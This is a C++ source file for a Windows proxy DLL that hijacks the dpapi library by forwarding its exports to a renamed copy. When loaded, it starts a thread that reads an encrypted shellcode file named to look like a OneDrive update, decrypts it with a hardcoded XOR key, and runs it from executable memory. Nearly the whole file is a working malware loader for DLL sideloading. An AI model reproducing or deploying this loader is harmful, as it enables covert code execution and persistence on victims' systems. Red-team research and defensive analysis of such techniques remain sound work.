#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <vector>

#pragma comment(lib, "ntdll")

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#pragma comment(linker, "/export:CryptProtectDataNoUI=dapi.CryptProtectDataNoUI,@1")
#pragma comment(linker, "/export:CryptProtectMemory=dapi.CryptProtectMemory,@2")
#pragma comment(linker, "/export:CryptResetMachineCredentials=dapi.CryptResetMachineCredentials,@3")
#pragma comment(linker, "/export:CryptUnprotectDataNoUI=dapi.CryptUnprotectDataNoUI,@4")
#pragma comment(linker, "/export:CryptUnprotectMemory=dapi.CryptUnprotectMemory,@5")
#pragma comment(linker, "/export:CryptUpdateProtectedState=dapi.CryptUpdateProtectedState,@6")
#pragma comment(linker, "/export:iCryptIdentifyProtection=dapi.iCryptIdentifyProtection,@7")

// XOR decryption routine
void decrypt(char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

DWORD WINAPI RunPayload(LPVOID lpParameter)
{

    // Read the payload file OneDrive.Update from the current working directory.
    FILE* fp;
    size_t shellcodeSize;
    unsigned char* shellcode;
    fp = fopen("OneDrive.Update", "rb");
    fseek(fp, 0, SEEK_END);
    shellcodeSize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    shellcode = (unsigned char*)malloc(shellcodeSize);
    fread(shellcode, shellcodeSize, 1, fp);

    // Insert your XOR key here
    char key[] = "iikoewarfkmzsdlhfnuiwaejrpai";

    // Decrypt the payload using XOR with the above key
    decrypt((char*)shellcode, shellcodeSize, key, sizeof(key));

    LPVOID newMemory;
    int writeResult;
    HANDLE currentProcess;

    // Get the current process handle
    currentProcess = GetCurrentProcess();

    // Allocate memory and set the read, write and execute flag
    newMemory = VirtualAllocEx(currentProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the newly allocated memory
    writeResult = WriteProcessMemory(currentProcess, newMemory, shellcode, shellcodeSize, NULL);

    ((void(*)())newMemory)();
    return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // https://gist.github.com/securitytube/c956348435cc90b8e1f7
        // Create a thread and close the handle as we do not want to use it to wait for it 
        threadHandle = CreateThread(NULL, 0, RunPayload, NULL, 0, NULL);
        CloseHandle(threadHandle);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

